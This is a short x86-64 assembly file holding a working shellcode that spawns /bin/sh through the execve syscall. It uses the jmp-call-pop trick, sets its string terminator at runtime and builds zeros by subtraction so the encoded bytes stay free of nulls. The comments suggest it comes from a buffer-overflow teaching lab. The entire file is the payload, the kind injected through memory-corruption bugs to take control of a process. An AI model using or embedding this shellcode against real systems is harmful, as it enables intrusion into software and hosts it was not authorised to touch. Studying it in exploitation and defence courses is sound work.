section .text
	global _start
_start:
	BITS 64
	jmp short two
one:
	pop rbx           

	xor al, al
	mov [rbx+7],  al

	mov [rbx+8],  rbx  ; store rbx to memory at address rbx + 8
	mov rax, 0x11111111
	sub rax, 0x11111111; rax = 0
	mov [rbx+16], rax  ; store rax to memory at address rbx + 16

	mov rdi, rbx       ; rdi = rbx
	lea rsi, [rbx+8]   ; rsi = rbx + 8    
	mov rdx, 0x11111111
	sub rdx, 0x11111111; rdx = 0
	mov rax, 0x1111113c
	sub rax, 0x11111101; rax = 59
	syscall
two:
	call one                                                                   
	db '/bin/sh', 0xFF ; The command string (the terminating zero will be set in the code)
	db 'AAAAAAAA'      ; Place holder for argv[0] 
	db 'BBBBBBBB'      ; Place holder for argv[1]
